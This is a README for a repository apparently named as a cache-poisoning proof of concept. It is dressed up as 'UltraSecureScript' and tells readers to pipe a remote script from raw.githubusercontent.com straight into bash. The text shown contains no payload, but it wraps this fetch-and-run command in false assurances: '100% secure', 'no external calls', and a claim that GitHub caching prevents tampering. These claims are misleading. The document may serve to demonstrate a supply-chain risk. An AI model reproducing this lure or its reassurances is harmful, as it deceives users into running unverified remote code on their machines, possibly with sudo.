# 🚀 UltraSecureScript: A Minimal Yet Secure Execution Showcase

Welcome to **UltraSecureScript**, the simplest and safest way to execute a remote script directly from GitHub. Unlike other repositories that may contain vulnerabilities, this script is designed with absolute **integrity, transparency, and security** in mind.

## 🔒 **Why This is 100% Secure**
- ✅ **Zero Dependencies** – No additional software required.
- ✅ **Read-Only Execution** – The script only prints a harmless message.
- ✅ **No External Calls** – Does not interact with third-party services.
- ✅ **Public Codebase** – Every commit is open and verifiable.
- ✅ **GitHub-Backed Integrity** – Hosted on a trusted platform with full version control.
- ✅ **No History Manipulation** – Every commit is permanent and visible.

## ⚡ **Instant Execution**
To run this script securely on your machine, simply use:

```sh
curl -sL https://raw.githubusercontent.com/SedrakyanGnel/Cache_Poisoning_POC/main/main.sh | bash
```

or click here to **inspect the script** before executing:  
👉 **[View main.sh (raw)](https://raw.githubusercontent.com/SedrakyanGnel/Cache_Poisoning_POC/main/main.sh)**  

**What happens?**
- 🛠️ The script executes harmlessly.
- 🔍 No background processes, no hidden dependencies.
- 📝 You can inspect the source code **before running** to verify.

## 🛡️ **FAQ**
### **Is it really safe to execute a remote script like this?**
Yes! In this case, the script simply runs:
```sh
sudo echo "Nothing special :) You will never get hacked"
```
There are **no privilege escalations**, no downloads, no system modifications. It’s as safe as running `echo` yourself!

### **Can I check the script before executing?**
Absolutely! Just viwe commit history:
**[View Commit History](https://github.com/SedrakyanGnel/Cache_Poisoning_POC/commits)**  

or click here:  
👉 **[View main.sh (raw)](https://raw.githubusercontent.com/SedrakyanGnel/Cache_Poisoning_POC/main/main.sh)**  

### **What if someone tries to tamper with this repo?**
GitHub ensures integrity with cryptographic signatures and commit histories. Additionally, `raw.githubusercontent.com` serves **cached versions** for stability, preventing sudden unexpected changes.
